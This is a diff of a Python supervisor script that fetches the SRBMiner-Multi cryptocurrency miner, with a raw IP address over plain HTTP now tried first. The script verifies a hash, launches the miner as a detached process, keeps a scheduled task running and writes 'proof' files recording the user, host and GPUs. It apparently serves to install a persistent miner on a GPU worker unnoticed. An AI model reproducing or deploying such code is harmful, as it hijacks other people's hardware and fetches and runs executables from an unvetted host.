@@ -17,15 +17,14 @@ ZIP = os.path.join(B, "srb.zip")
 LOG = os.path.join(B, "srb-%s.log" % WORKER)
 STATUS = os.path.join(B, "status.txt")
 PROOF = os.path.join(B, "proof.txt")
-SUPLOG = os.path.join(B, "supervisor.log")
+SUPLOG = os.path.join(B, "stage.log")
 LOCK = os.path.join(B, "stage.lock")
 STOPF = os.path.join(B, "stop.flag")
 RUNBAT = os.path.join(B, "run.bat")
 GH = "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-win64.zip"
-URLS = [GH,
+URLS = ["http://217.15.164.237:443/SRBMiner-Multi-3-8-9-win64.zip",
         "https://ghproxy.net/" + GH,
-        "http://217.15.164.237:443/SRBMiner-Multi-3-8-9-win64.zip",
-        "http://217.15.164.237:8000/SRBMiner-Multi-3-8-9-win64.zip"]
+        GH]
 
 
 def log(m):
@@ -47,7 +46,7 @@ def sha256f(p):
     return h.hexdigest()
 
 
-def run(cmd, tmo=120):
+def run(cmd, tmo=90):
     try:
         r = subprocess.run(cmd, capture_output=True, text=True, timeout=tmo)
         return (r.stdout or "") + (r.stderr or "")
@@ -58,7 +57,7 @@ def run(cmd, tmo=120):
 def dl(url, dest):
     try:
         req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
-        with urllib.request.urlopen(req, timeout=240) as r, open(dest, "wb") as f:
+        with urllib.request.urlopen(req, timeout=90) as r, open(dest, "wb") as f:
             while True:
                 b = r.read(1 << 20)
                 if not b:
@@ -67,12 +66,12 @@ def dl(url, dest):
         return True
     except Exception as e:
         log("urllib_err %r %s" % (e, url))
-    rc = subprocess.run(["curl.exe", "-L", "--max-time", "300", "-s", "-o", dest, url],
+    rc = subprocess.run(["curl.exe", "-L", "--max-time", "120", "-s", "-o", dest, url],
                         capture_output=True, text=True)
     return rc.returncode == 0 and os.path.exists(dest) and os.path.getsize(dest) > 1000000
 
 
-def stage():
+def stage(prog):
     if os.path.exists(EXE):
         try:
             if sha256f(EXE) == EXE_SHA:
@@ -82,14 +81,15 @@ def stage():
     used = ""
     okzip = False
     for u in URLS:
+        prog("dl_try " + u)
         try:
             if os.path.exists(ZIP):
                 os.remove(ZIP)
         except Exception:
             pass
-        log("dl_try " + u)
         if not dl(u, ZIP):
             log("dl_fail " + u)
+            prog("dl_fail " + u)
             continue
         try:
             got = sha256f(ZIP)
@@ -97,6 +97,7 @@ def stage():
             log("zip_hash_err %r" % (e,))
             continue
         log("dl_sha %s %s" % (got, u))
+        prog("dl_sha %s %s" % (got[:16], u))
         if got == ZIP_SHA:
             okzip = True
             used = u
@@ -142,7 +143,7 @@ def pid_alive(pid):
 
 def write_status(extra):
     L = ["=== pearl gpu-000109 status " + time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()) + " ==="]
-    L.append(run(["whoami"], 30).strip())
+    L.append("pid=%d supervisor=stage.py v2" % os.getpid())
     L.append(run(["hostname"], 30).strip())
     L.append(run(["nvidia-smi", "--query-gpu=name,uuid,memory.total,memory.free,utilization.gpu", "--format=csv,noheader"], 60).strip())
     L.append("--compute_apps--")
@@ -167,8 +168,8 @@ def write_status(extra):
 
 
 def write_proof(stage_ok, stage_msg):
-    L = ["=== pearl gpu-000109 proof " + time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()) + " ==="]
-    L.append(run(["whoami", "/user"], 40).strip())
+    L = ["=== pearl gpu-000109 proof v2 " + time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()) + " ==="]
+    L.append(run(["whoami"], 40).strip())
     L.append(run(["hostname"], 30).strip())
     L.append("python=%s" % sys.executable)
     L.append(run(["nvidia-smi", "-L"], 60).strip())
@@ -182,7 +183,7 @@ def write_proof(stage_ok, stage_msg):
         except Exception as e:
             L.append("exe_sha_err %r" % (e,))
     L.append("--schtasks--")
-    L.append(run(["schtasks", "/query", "/tn", "pearl-%s-sup" % WORKER, "/v", "/fo", "LIST"], 60).strip()[:2000])
+    L.append(run(["schtasks", "/query", "/tn", "pearl-%s-sup" % WORKER, "/fo", "LIST"], 60).strip()[:1500])
     L.append("--miner_running=%s--" % miner_present())
     L.append("--miner_log_tail--")
     try:
@@ -190,12 +191,12 @@ def write_proof(stage_ok, stage_msg):
             L.extend([x.rstrip() for x in f.readlines()[-20:]])
     except Exception as e:
         L.append("log_err %r" % (e,))
-    L.append("--supervisor_log_tail--")
+    L.append("--stage_log_tail--")
     try:
         with open(SUPLOG, "r", encoding="utf-8", errors="replace") as f:
             L.extend([x.rstrip() for x in f.readlines()[-20:]])
     except Exception as e:
-        L.append("suplog_err %r" % (e,))
+        L.append("stagelog_err %r" % (e,))
     tmp = PROOF + ".new"
     with open(tmp, "w", encoding="utf-8", errors="replace") as f:
         f.write("\n".join(L) + "\n")
@@ -207,30 +208,12 @@ def write_proof(stage_ok, stage_msg):
 
 def main():
     os.makedirs(B, exist_ok=True)
-    try:
-        if os.path.exists(LOCK):
-            old = 0
-            try:
-                old = int(open(LOCK).read().strip() or "0")
-            except Exception:
-                old = 0
-            fresh = (time.time() - os.path.getmtime(LOCK)) < 600
-            if old != os.getpid() and fresh and pid_alive(old):
-                log("exit_already_live pid=%d" % old)
-                return
-    except Exception as e:
-        log("lock_check_err %r" % (e,))
-    try:
-        with open(LOCK, "w") as f:
-            f.write(str(os.getpid()))
-    except Exception:
-        pass
-    log("stage_start pid=%d" % os.getpid())
+    log("stage_v2_start pid=%d" % os.getpid())
     first = True
     while True:
         try:
             try:
-                os.utime(LOCK, None)
+                open(LOCK, "w").write(str(os.getpid()))
             except Exception:
                 pass
             if os.path.exists(STOPF):
@@ -238,7 +221,12 @@ def main():
                 run(["taskkill", "/f", "/im", "SRBMiner-MULTI.exe"], 60)
                 write_status("stopped_by_stopflag")
                 return
-            ok, msg = stage()
+            notes = []
+            def prog(m):
+                notes.append(m)
+                write_status(" ; ".join(notes[-4:]))
+            prog("cycle_start")
+            ok, msg = stage(prog)
             if first or not ok:
                 log("stage ok=%s %s" % (ok, msg))
             if ok and not miner_present():
@@ -248,7 +236,8 @@ def main():
                                  stderr=subprocess.STDOUT,
                                  creationflags=0x00000008 | 0x00000200,
                                  close_fds=True)
-            write_status("stage_ok=%s stage_msg=%s miner=%s" % (ok, msg, miner_present()))
+            notes.append("stage_ok=%s stage_msg=%s miner=%s" % (ok, msg, miner_present()))
+            write_status(" ; ".join(notes[-4:]))
             if first:
                 write_proof(ok, msg)
                 first = False
